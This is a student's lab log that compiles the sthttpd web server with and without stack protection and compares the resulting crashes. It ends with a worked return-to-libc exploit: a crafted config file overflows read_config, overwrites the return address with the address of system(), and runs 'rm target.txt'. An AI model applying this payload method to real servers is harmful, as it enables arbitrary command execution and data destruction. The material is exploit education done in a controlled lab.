Christopher Zhu

1.
Steps to set update GCC to 4.9.2
$ nano .bash_profile		// open basic text editor
PATH=/usr/local/cs/bin:$PATH  		// added line in text editor
<CTRL>-o, then <ENTER>			// Saves file
<CTRL>-x					// exits and returns to menu

$ which gcc					// Steps to make sure gcc is updated
/usr/local/cs/bin/gcc
$ gcc -v
gcc version 4.9.2 (GCC)


Downloaded sthttpd source code

Try to SCP tarball to seasnet server
scp sthttpd­2.27.0.tar.gz  <USERNAME>@lnxsrv.seas.ucla.edu:~	// Error

download source code using curl command:
$ curl -O http://www.cs.ucla.edu/classes/spring15/cs33/lab/sthttpd-2.27.0.tar.gz

$ ls									// list the directories in the tar.gz
sthttpd-2.27.0.tar.gz

Decompress .tar file:
$ tar -xvf sthttpd-2.27.0.tar.gz
$ ls
sthttpd-2.27.0  sthttpd-2.27.0.tar.gz

//Failed 
-bash: config.log: command not found

$ ls
    aclocal.m4   config.status  docs        Makefile.am   missing  stamp-h1
    config.h     configure      extras      Makefile_ek   README   TODO
    config.h.in  configure.ac   install-sh  Makefile_ek~  scripts  www
    config.log   depcomp        Makefile    Makefile.in   src
	
cd sthttpd­2.27.0			// change directory to the files



2.
//Generate Makefiles
$ ./configure \
       CFLAGS='-m32' \
       LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-$(gcc -dumpversion)/lib"
	   
Build executable:
A. SP:
$ make clean
$ make CFLAGS='-m32 -g3 -O2 -fno-inline -fstack-protector-strong'
# it thinks awhile, then creates executable src/thttpd
$ mv src/thttpd src/thttpd-sp

B. AS:
$ make clean
$ make CFLAGS='-m32 -g3 -O2 -fno-inline -fsanitize=address'
# it thinks awhile, then creates executable src/thttpd
$ mv src/thttpd src/thttpd-as

C. NO:
$ make clean
$ make CFLAGS='-m32 -g3 -O2 -fno-inline
# it thinks awhile, then creates executable src/thttpd
$ mv src/thttpd src/thttpd-no


3. Port numbers are:
SP- 12420
AS- 12421
NO- 12422

4.
//Create test file to make sure everything is working
$ echo 'this is a test file, high five' > testfile.txt
    $ cat testfile.txt
    this is a test file, high five

$ src/thttpd-sp -p 50000			// connects to arbitrary port 50000
$ ps -u ericki						// followed TA's instruction FAILED
									// thttpd-sp not found
									
$ src/thttpd-sp -p 12420			// connect to my personal port
$ ps -u christoz					// use my own account since I am the user
PID TTY          TIME CMD
20906 ?        00:00:00 sshd
20908 pts/2    00:00:00 bash
25515 ?        00:00:00 thttpd-sp
25523 pts/2    00:00:00 ps

Success thttpd-sp is found working

(gdb) run -p 12420 -D -C testfile.txt	// Failure, Inferior 1 exit with code 01

Changed testfile.txt
port=12420#fieihapwiegiowhghapwegiaggapiegwhipegoaihgiowpheghpawhepgiowepgoiwaeghpaiowepgiwaohpgoiwahpgieohapwioegpoiwahpgiowaehpgioahwpioehpaiwohegopa

gdb --args src/thttpd-sp -p 12420 -D -C testfile.txt		//running the file under gdb
break read_config 					// set up break points
set disassemble-next-line on 		// displays next source line
run 								// starts the program
ni									// step over

Backtrace stopped: previous frame inner to this frame (corrupt stack?)



The program crashes at the machine instruction: 0x0804b69a <read_config+1434>:	call	0x8049b68 <__stack_chk_fail@plt>. 
This instruction checks is called since the program realizes that the canaries have been overwritten. The canaries get 
overwritten in the machine instruction: 0x0804b146 <read_config+70>:	call	0x8049848 <fgets@plt>. 
My reasoning is because, the source file for read_config requires 100 bytes for the char array after the patch, 
4 bytes for the filename char* that is in the argument, 4 bytes for the FILE* fp, 4 bytes for the char* cp, 4 bytes 
for the char* cp2, 4 bytes for the char* name, and 4 bytes for the char* value. This results in 124 bytes. However, the 
program itself decrements by 148 bytes as seen in the machine instruction:
0x0804b106 <read_config+6>:	sub	$0x94,%esp. When the function calls fgets, it reads in a array of chars that is around 1000 characters which 
thus add this onto the stack and overwrites the stack which includes the canary. This is seen in a later call where the program checks its canaries 
at the end to check for smashing as seen in the machine instruction: 0x0804b607 <read_config+1287>:	xor	%gs:0x14,%eax. However, since the canaries 
were overwritten since our char array is too large, the program goes through with the jump not equal call since the xor does not return 0 as seen in the line: 
0x0804b60e <read_config+1294>:	jne	0x804b69a <read_config+1434>. This makes the program undergo the process of crashing because it realizes that
the canaries have been overwritten because the program senses that someone is trying to smash the program.

The program crashes at the machine instruction 0x0804da6b <read_config+171>:	call	0x804a484 <strchr@plt>. This is because when we use 
-fsanitize=address, it allocates memory anytime we create an array that will become poisonous whenever an overflow in the array is attempted.
Since our we make our character array longer than 100 chars, it overflows and causes some of the memory around the array to be poisoned and thus when the program 
checks the memory locations, it throws the program into its crashing phase because it knows that the program is being smashed.

The program crashes after the machine instruction: 0x0804b4ba <read_config+1274>:	c3	ret because since this 
program has no canaries and our char array that we created is so long, the return address is overwritten so that 
the program is sent to a garbage address for its return. The return address is located above the base pointer and 
since our stack builds up, our config file overflowed into other memory and eventually reached 
the return address call where it then is replaced with some garbage address. The program then calls the return address 
and is sent to a garbage address which it does not have permission to access which then results in the segmentation fault 
and causes the program to crash.






8.
By examining the assembly code, there is not much difference between src/thttpd-sp.s and src/thttpd-no.s.
This is because -fstack-protector-strong creates canaries for only some functions (roughly twenty percenty) in order 
to check for buffer-overrun exploits because if it had it for each function, the program would run very slowly. 
In this case, the function handle_read does not have canaries so it produces the same result as having nothing. 
The -fsanitize=address uses shadow memory in order to prevent buffer-overrun exploits in handle_read. It does 
so by replacing the malloc and free functions and makes the memory around the malloc-ed regions which are also 
known as red zones to be poisoned. The memory from free is also poisoned and on every memory access compiler-injected 
code looks to see whether or not if the shadow has become poisoned.


./configure CFLAGS='-m32 -S -c' LDFLAGS="-Xlinker --rpath=/usr/local/cs/gcc-4.9.2/lib/"			// configure

make clean							// cleans up
make CFLAGS='-m32 -S -O2 -fno-inline -fstack-protector-strong -c' 					// makes sp and generates assembly code
mv src/thttpd.o src/thttpd-sp.s														// saves assembly code into thttpd-sp.s


make clean							// cleans up
make CFLAGS='-m32 -S -O2 -fno-inline -fsanitize=address -c'							// makes as and generates assembly code 
mv src/thttpd.o src/thttpd-as.s 													// saves assembly code into thttpd-as.s


make clean							// cleans up
make CFLAGS='-m32 -S -O2 -fno-inline -c' 											// makes no and generates assembly code
mv src/thttpd.o src/thttpd-no.s														// saves assembly code into thttpd-no.s

9.
Config file is named testfile.txt.

My original config file (testfile.txt): 
port=12421fieihapwiegiowhghapwegiaggapiegwhipegoaihgiowpheghpawhepgiowepgoiwaeghpaiowepgiwaohpgoiwahpgieohapwioegpoiwahpgiowaehpgioahwpioehpaiwohegopasdasdfasdfasdfasdfasdfasdfa
by converting the value to from ascii to hex using the website asciitohex.com results in:
31 32 34 32 31 66 69 65 69 68 61 70 77 69 65 67 69 6f 77 68 67 68 
61 70 77 65 67 69 61 67 67 61 70 69 65 67 77 68 69 70 65 67 6f 61 
69 68 67 69 6f 77 70 68 65 67 68 70 61 77 68 65 70 67 69 6f 77 65 
70 67 6f 69 77 61 65 67 68 70 61 69 6f 77 65 70 67 69 77 61 6f 68 
70 67 6f 69 77 61 68 70 67 69 65 6f 68 61 70 77 69 6f 65 67 70 6f 
69 77 61 68 70 67 69 6f 77 61 65 68 70 67X69X6fX61 68 77 70 69 6f 
65 68 70 61 69 77 6f 68 65 67 6f 70 61 73 64 61 73 64 66 61 73 64 
66 61 73 64 66 61 73 64 66 61 73 64 66 61 73 64 66 61

Then, I look at the source code to see where the return address takes the program which is:
=> 0x0804b4ba <read_config+1274>:       c3      ret
(gdb)
0x616f6967 in ?? ()
=> 0x616f6967:  Cannot access memory at address 0x616f6967

This means that the address that the program is at after returning which is garbage is 0x616f6967. Since the machine uses little endian,
I need to look for the pattern in reverse order which would be the hex values: 67 69 6f 61 which is shown in the above hex codes that is separated by
'X' characters. So now that we have the location for where the return address is going to, we want to find where this is in our ascii code. By realizing that
each hex character is one character, we deduce that the location within our ascii code for the return address is:
port=12421fieihapwiegiowhghapwegiaggapiegwhipegoaihgiowpheghpawhepgiowepgoiwaeghpaiowepgiwaohpgoiwahpgieohapwioegpoiwahpgiowaehpgioahwpioehpaiwohegopasdasdfasdfasdfasdfasdfasdfa
                                                                                                                                XXXX
where gioa is the location of the return address. Now that we have this, we want to make the program return to the system address so that we can delete the target file instead 
of sending the program to a random junk address. Since our system address that we deduced is 0x009b8f70, we convert this first to little endian which results in the hex values:
70 8f 9b 00. By using Notepad++'s function to change hex to ascii, we get the following ascii code: 
p 
We add a # sign in so the machine can recognize it and shows us the location of where it is at. Therefore we get #p  and replace of the garbage 
return address, gioa, with it. Since the program returns, it then decrements the stack pointer by 4 bytes so we put in 4 bytes of garbage value as seen in AAAA. 
The new config file is shown as:

port=12421fieihapwiegiowhghapwegiaggapiegwhipegoaihgiowpheghpawhepgiowepgoiwaeghpaiowepgiwaohpgoiwahpgieohapwioegpoiwahpgiowaehp#p AAAAhwpioehpaiwohegopasdasdfasdfasdfasdfasdfasdfa

After this, the program will then return to the system function and then decrement the stack pointer by 4. Therefore, I then want to pass it the argument for target.txt
which is a pointer which also requires 4 bytes. But since we do not know the address for target.txt, we create one by realizing that a pointer takes 4 bytes. Therefore,
we use the print &line function which returns us the address of the char array. This corresponds to the pointer pointing at p in port within our config file. We want to put 
our target right after the = sign for port so that the program still runs so we use a # sign to make the rest of the characters as comments. Now that we have the pointer to the 
char array: 0xffffc2bc, we add this by 6 since port=# is 6 bytes and obtain 0xffffc2c2. Then after our # sign we put in rm in order for us to actually remove target.txt.
Afterwards, we change the address (0xffffc2c2) back to little endian which results in c2 c2 ff ff. Then, we must convert this pointer to ascii so that we can put it into our config file. 
Using Notepad++'s program to change hex to ascii values, we get: . Also, we must add a nullbyte after target.txt so that the program knows when to stop reading the code
for the argument for system function. I also deleted the rest of the config file after the pointer which points to the location of our rm target.txt within the config file
because it will not get called and is thus useless. Therefore, our new config file results in:
port=#rm target.txt 12421fieihapwowhghapwegipegoaihgiowpheghpawhepgiowepgoiwaeghpaiowepgiwaohpgoiwahpgieohapwioegpoiwahpgiowaeh#p AAAAÂÂÿÿ

This shows that the first time we ran through it, we were successfully able to delete target.txt since when we try to run the program a second time to delete 
target.txt again, it says it cannot be found, and thus we are successful. We also know it is successful because AAAA is where the program should return to after 
it has finished the system rm function and thus results in a segmentation fault.
